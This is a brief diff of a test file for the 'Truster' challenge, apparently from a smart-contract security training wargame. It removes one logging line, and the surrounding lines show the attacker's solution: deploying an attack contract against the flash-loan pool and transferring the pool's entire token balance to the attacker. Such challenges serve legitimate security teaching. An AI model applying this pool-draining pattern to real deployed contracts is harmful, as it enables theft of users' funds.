@@ -33,8 +33,6 @@ describe('[Challenge] Truster', function () {
         this.attackTruster = await AttackTruster.deploy(this.pool.address, this.token.address);
 
         const amount = await this.token.balanceOf(this.pool.address);
-        console.log(amount);
-
         await this.attackTruster.connect(attacker).attack(amount);
         await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, amount);
     });
